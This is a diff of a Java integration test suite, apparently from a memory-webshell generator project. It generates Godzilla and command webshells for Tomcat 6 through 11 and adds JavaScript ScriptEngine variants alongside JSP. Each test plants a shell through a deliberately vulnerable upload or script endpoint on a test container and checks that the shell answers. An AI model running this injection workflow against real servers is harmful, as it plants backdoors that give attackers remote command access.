@@ -6,6 +6,7 @@ import com.reajason.javaweb.config.Server;
 import com.reajason.javaweb.integration.CommandShellTool;
 import com.reajason.javaweb.integration.GodzillaShellTool;
 import com.reajason.javaweb.integration.VulTool;
+import com.reajason.javaweb.memsell.packer.Packer;
 import com.reajason.javaweb.memsell.tomcat.TomcatShell;
 import lombok.extern.slf4j.Slf4j;
 import net.bytebuddy.jar.asm.Opcodes;
@@ -57,14 +58,14 @@ public class TomcatIntegrationTest {
 
         @ParameterizedTest(name = tomcat6ImageName + "|{0}Godzilla|JSP")
         @ValueSource(strings = {TomcatShell.FILTER, TomcatShell.LISTENER, TomcatShell.VALVE})
-        void testGodzilla(String shellType) {
-            testGodzillaJspInjectAssertOk(getUrl(tomcat), shellType, Opcodes.V1_6);
+        void testGodzillaJSP(String shellType) {
+            testGodzillaAssertOk(getUrl(tomcat), shellType, Opcodes.V1_6, Packer.INSTANCE.JSP);
         }
 
         @ParameterizedTest(name = tomcat6ImageName + "|{0}Command|JSP")
         @ValueSource(strings = {TomcatShell.FILTER, TomcatShell.LISTENER, TomcatShell.VALVE})
-        void testCommand(String shellType) {
-            testCommandJspInjectAssertOk(getUrl(tomcat), shellType, Opcodes.V1_6);
+        void testCommandJSP(String shellType) {
+            testCommandAssertOk(getUrl(tomcat), shellType, Opcodes.V1_6, Packer.INSTANCE.JSP);
         }
     }
 
@@ -80,14 +81,15 @@ public class TomcatIntegrationTest {
 
         @ParameterizedTest(name = tomcat7ImageName + "|{0}Godzilla|JSP")
         @ValueSource(strings = {TomcatShell.FILTER, TomcatShell.LISTENER, TomcatShell.VALVE})
-        void testGodzilla(String shellType) {
-            testGodzillaJspInjectAssertOk(getUrl(tomcat), shellType, Opcodes.V1_7);
+        void testGodzillaJSP(String shellType) {
+            testGodzillaAssertOk(getUrl(tomcat), shellType, Opcodes.V1_7, Packer.INSTANCE.JSP);
         }
+
 
         @ParameterizedTest(name = tomcat7ImageName + "|{0}Command|JSP")
         @ValueSource(strings = {TomcatShell.FILTER, TomcatShell.LISTENER, TomcatShell.VALVE})
-        void testCommand(String shellType) {
-            testCommandJspInjectAssertOk(getUrl(tomcat), shellType, Opcodes.V1_7);
+        void testCommandJSP(String shellType) {
+            testCommandAssertOk(getUrl(tomcat), shellType, Opcodes.V1_7, Packer.INSTANCE.JSP);
         }
     }
 
@@ -102,14 +104,26 @@ public class TomcatIntegrationTest {
 
         @ParameterizedTest(name = tomcat8ImageName + "|{0}Godzilla|JSP")
         @ValueSource(strings = {TomcatShell.FILTER, TomcatShell.LISTENER, TomcatShell.VALVE})
-        void testGodzilla(String shellType) {
-            testGodzillaJspInjectAssertOk(getUrl(tomcat), shellType, Opcodes.V1_8);
+        void testGodzillaJSP(String shellType) {
+            testGodzillaAssertOk(getUrl(tomcat), shellType, Opcodes.V1_8, Packer.INSTANCE.JSP);
+        }
+
+        @ParameterizedTest(name = tomcat8ImageName + "|{0}Godzilla|JS")
+        @ValueSource(strings = {TomcatShell.FILTER, TomcatShell.LISTENER, TomcatShell.VALVE})
+        void testGodzillaJS(String shellType) {
+            testGodzillaAssertOk(getUrl(tomcat), shellType, Opcodes.V1_8, Packer.INSTANCE.ScriptEngine);
         }
 
         @ParameterizedTest(name = tomcat8ImageName + "|{0}Command|JSP")
         @ValueSource(strings = {TomcatShell.FILTER, TomcatShell.LISTENER, TomcatShell.VALVE})
-        void testCommand(String shellType) {
-            testCommandJspInjectAssertOk(getUrl(tomcat), shellType, Opcodes.V1_8);
+        void testCommandJSP(String shellType) {
+            testCommandAssertOk(getUrl(tomcat), shellType, Opcodes.V1_8, Packer.INSTANCE.JSP);
+        }
+
+        @ParameterizedTest(name = tomcat8ImageName + "|{0}Command|JS")
+        @ValueSource(strings = {TomcatShell.FILTER, TomcatShell.LISTENER, TomcatShell.VALVE})
+        void testCommandJS(String shellType) {
+            testCommandAssertOk(getUrl(tomcat), shellType, Opcodes.V1_8, Packer.INSTANCE.ScriptEngine);
         }
     }
 
@@ -124,14 +138,14 @@ public class TomcatIntegrationTest {
 
         @ParameterizedTest(name = tomcat9ImageName + "|{0}Godzilla|JSP")
         @ValueSource(strings = {TomcatShell.FILTER, TomcatShell.LISTENER, TomcatShell.VALVE})
-        void testGodzilla(String shellType) {
-            testGodzillaJspInjectAssertOk(getUrl(tomcat), shellType, Opcodes.V9);
+        void testGodzillaJSP(String shellType) {
+            testGodzillaAssertOk(getUrl(tomcat), shellType, Opcodes.V9, Packer.INSTANCE.JSP);
         }
 
         @ParameterizedTest(name = tomcat9ImageName + "|{0}Command|JSP")
         @ValueSource(strings = {TomcatShell.FILTER, TomcatShell.LISTENER, TomcatShell.VALVE})
-        void testCommand(String shellType) {
-            testCommandJspInjectAssertOk(getUrl(tomcat), shellType, Opcodes.V9);
+        void testCommandJSP(String shellType) {
+            testCommandAssertOk(getUrl(tomcat), shellType, Opcodes.V9, Packer.INSTANCE.JSP);
         }
     }
 
@@ -146,14 +160,14 @@ public class TomcatIntegrationTest {
 
         @ParameterizedTest(name = tomcat10ImageName + "|{0}Godzilla|JSP")
         @ValueSource(strings = {TomcatShell.JAKARTA_FILTER, TomcatShell.JAKARTA_LISTENER, TomcatShell.JAKARTA_VALVE})
-        void testGodzilla(String shellType) {
-            testGodzillaJspInjectAssertOk(getUrl(tomcat), shellType, Opcodes.V11);
+        void testGodzillaJSP(String shellType) {
+            testGodzillaAssertOk(getUrl(tomcat), shellType, Opcodes.V11, Packer.INSTANCE.JSP);
         }
 
         @ParameterizedTest(name = tomcat10ImageName + "|{0}Command|JSP")
         @ValueSource(strings = {TomcatShell.JAKARTA_FILTER, TomcatShell.JAKARTA_LISTENER, TomcatShell.JAKARTA_VALVE})
-        void testCommand(String shellType) {
-            testCommandJspInjectAssertOk(getUrl(tomcat), shellType, Opcodes.V11);
+        void testCommandJSP(String shellType) {
+            testCommandAssertOk(getUrl(tomcat), shellType, Opcodes.V11, Packer.INSTANCE.JSP);
         }
     }
 
@@ -168,18 +182,18 @@ public class TomcatIntegrationTest {
 
         @ParameterizedTest(name = tomcat11ImageName + "|{0}Godzilla|JSP")
         @ValueSource(strings = {TomcatShell.JAKARTA_FILTER, TomcatShell.JAKARTA_LISTENER, TomcatShell.JAKARTA_VALVE})
-        void testGodzilla(String shellType) {
-            testGodzillaJspInjectAssertOk(getUrl(tomcat), shellType, Opcodes.V17);
+        void testGodzillaJSP(String shellType) {
+            testGodzillaAssertOk(getUrl(tomcat), shellType, Opcodes.V17, Packer.INSTANCE.JSP);
         }
 
         @ParameterizedTest(name = tomcat11ImageName + "|{0}Command|JSP")
         @ValueSource(strings = {TomcatShell.JAKARTA_FILTER, TomcatShell.JAKARTA_LISTENER, TomcatShell.JAKARTA_VALVE})
-        void testCommand(String shellType) {
-            testCommandJspInjectAssertOk(getUrl(tomcat), shellType, Opcodes.V17);
+        void testCommandJSP(String shellType) {
+            testCommandAssertOk(getUrl(tomcat), shellType, Opcodes.V17, Packer.INSTANCE.JSP);
         }
     }
 
-    private void testGodzillaJspInjectAssertOk(String url, String shellType, int targetJdkVersion) {
+    private void testGodzillaAssertOk(String url, String shellType, int targetJdkVersion, Packer.INSTANCE packer) {
         String pass = "pass" + shellType;
         String key = "key" + shellType;
         String headerValue = "Godzilla" + shellType;
@@ -187,26 +201,38 @@ public class TomcatIntegrationTest {
                 .pass(pass).key(key)
                 .headerName("User-Agent").headerValue(headerValue)
                 .build();
-        String jspContent = GodzillaShellTool.generateJsp(Server.TOMCAT, shellConfig, shellType, targetJdkVersion);
         log.info("generated {} godzilla with pass: {}, key: {}, headerValue: {}", shellType, pass, key, headerValue);
-        String filename = shellType + ".jsp";
-        String uploadEntry = url + "/upload";
-        String jspEntry = url + "/" + filename;
-        VulTool.uploadJspFileToServer(uploadEntry, filename, jspContent);
-        VulTool.urlIsOk(jspEntry);
-        GodzillaShellTool.testIsOk(jspEntry, shellConfig);
+        String content = GodzillaShellTool.generate(Server.TOMCAT, shellConfig, shellType, targetJdkVersion, packer);
+        String shellUrl = url + "/";
+        if (Packer.INSTANCE.JSP.equals(packer)) {
+            String uploadEntry = url + "/upload";
+            String filename = shellType + ".jsp";
+            shellUrl = url + "/" + filename;
+            VulTool.uploadJspFileToServer(uploadEntry, filename, content);
+            VulTool.urlIsOk(shellUrl);
+        } else if (Packer.INSTANCE.ScriptEngine.equals(packer)) {
+            String uploadEntry = url + "/js";
+            VulTool.postJS(uploadEntry, content);
+        }
+        GodzillaShellTool.testIsOk(shellUrl, shellConfig);
     }
 
-    private void testCommandJspInjectAssertOk(String url, String shellType, int targetJdkVersion) {
+    private void testCommandAssertOk(String url, String shellType, int targetJdkVersion, Packer.INSTANCE packer) {
         String paramName = "Command" + shellType;
         CommandShellConfig config = CommandShellConfig.builder().paramName(paramName).build();
-        String jspContent = CommandShellTool.generateJsp(Server.TOMCAT, config, shellType, targetJdkVersion);
+        String content = CommandShellTool.generate(Server.TOMCAT, config, shellType, targetJdkVersion, packer);
         log.info("generated {} command shell with paramName: {}", shellType, config.getParamName());
-        String filename = shellType + ".jsp";
-        String uploadEntry = url + "/upload";
-        String jspEntry = url + "/" + filename;
-        VulTool.uploadJspFileToServer(uploadEntry, filename, jspContent);
-        VulTool.urlIsOk(jspEntry);
-        CommandShellTool.testIsOk(jspEntry, config);
+        String shellUrl = url + "/";
+        if (Packer.INSTANCE.JSP.equals(packer)) {
+            String uploadEntry = url + "/upload";
+            String filename = shellType + ".jsp";
+            shellUrl = url + "/" + filename;
+            VulTool.uploadJspFileToServer(uploadEntry, filename, content);
+            VulTool.urlIsOk(shellUrl);
+        } else if (Packer.INSTANCE.ScriptEngine.equals(packer)) {
+            String uploadEntry = url + "/js";
+            VulTool.postJS(uploadEntry, content);
+        }
+        CommandShellTool.testIsOk(shellUrl, config);
     }
 }
